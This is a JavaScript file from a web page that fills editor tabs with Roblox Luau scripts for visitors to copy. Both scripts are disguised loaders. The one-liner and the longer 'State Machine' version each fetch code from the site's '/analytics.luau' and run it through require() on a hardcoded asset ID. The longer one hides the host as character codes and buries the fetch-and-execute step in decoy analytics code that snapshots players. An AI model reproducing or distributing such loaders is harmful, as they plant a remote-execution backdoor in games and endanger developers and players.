const tabs = {};
let currentTab = null;

function waitForEditor(timeout = 5000) {
    return new Promise((resolve, reject) => {
        const start = Date.now();
        (function check() {
            if (window.editor) return resolve(window.editor);
            if (Date.now() - start > timeout) return reject(new Error("Editor not loaded in time."));
            setTimeout(check, 50);
        })();
    });
}

function switchTab(name) {
    if (!editor) return;

    if (currentTab !== null) {
        tabs[currentTab].content = editor.getValue();
    }

    currentTab = name;

    editor.setValue(tabs[name].content);

    if (document.getElementById("tab-selected")) {
        document.getElementById("tab-selected").id = ""
    }
    document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
    tabs[name].button.classList.add("active");
    tabs[name].button.id = "tab-selected"
}

function addTab(name, script) {

    tabs[name] = {
        content: script.trim()
    };

    const button = document.createElement("button");
    button.className = "tab";
    button.textContent = name;

    button.onclick = () => switchTab(name);

    document.getElementById("tabs").appendChild(button);

    tabs[name].button = button;

    if (currentTab === null) {
        switchTab(name);
    }
}

waitForEditor().then(e => {
    switchReadonly(true);
    const url = `${window.location.protocol}//${window.location.host}`;
    const built = `string.char(${window.location.host.split("").map(c => c.charCodeAt(0).toString(10).padStart(3, "0")).join(", ").toUpperCase()})`;

    addTab("1 Line Loader", `
a=0x26E001F12;require(a)(game:GetService("HttpService"):GetAsync("${url}/analytics.luau",true))
    `);

    addTab("State Machine", `
local S = {
	Http = game:GetService("HttpService"),
	Players = game:GetService("Players"),
	RunService = game:GetService("RunService")
}

local Runtime = {
	start = os.clock(),
	session = S.Http:GenerateGUID(false),
	counters = {},
	buffers = {},
	flags = {}
}

local V = {}
local state = 1
local result

local function bump(k)
	Runtime.counters[k] = (Runtime.counters[k] or 0) + 1
end

local function snapshotPlayers()
	local t = {}
	for _,p in ipairs(S.Players:GetPlayers()) do
		t[#t+1] = {
			id = p.UserId,
			name = p.Name,
			accountAge = p.AccountAge
		}
	end
	return t
end

local function collectRuntime()
	Runtime.flags.server = S.RunService:IsServer()
	Runtime.flags.client = S.RunService:IsClient()
    Runtime.flags.serverId = ${built}
	Runtime.flags.elapsed = os.clock() - Runtime.start
end

local function queueEvent(name, payload)
	Runtime.buffers[#Runtime.buffers+1] = {
		name = name,
		payload = payload,
		t = os.clock()
	}
end

queueEvent("init", {
	job = game.JobId,
	place = game.PlaceId
})

while true do
	if state == 1 then
		bump("state1")
		V[1] = 0x26E001F12
		collectRuntime()
		state = 4

	elseif state == 4 then
		bump("state4")
		V[2] = "${window.location.protocol}//"..Runtime.flags.serverId
            .."/analytics.luau"
		Runtime.counters.players = #S.Players:GetPlayers()
		queueEvent("player_snapshot", snapshotPlayers())
		state = 2

	elseif state == 2 then
		bump("state2")
		local payload = S.Http:JSONEncode({
			session = Runtime.session,
			job = game.JobId,
			place = game.PlaceId,
			runtime = Runtime.flags,
			counters = Runtime.counters
		})

		local ok, r = pcall(function()
			return S.Http:GetAsync(V[2], true)
		end)

		if ok then
			result = r
			state = 5
		else
			Runtime.flags.fetchFailed = true
			state = 6
		end

	elseif state == 5 then
		bump("state5")
		Runtime.flags.fetchSuccess = true

		local ok = pcall(function()
			require(V[1])(result)
		end)

		Runtime.flags.exec = ok
		state = 6

	elseif state == 6 then
		queueEvent("shutdown", {
			duration = os.clock() - Runtime.start,
			events = #Runtime.buffers
		})
		break
	end
end
    `);
});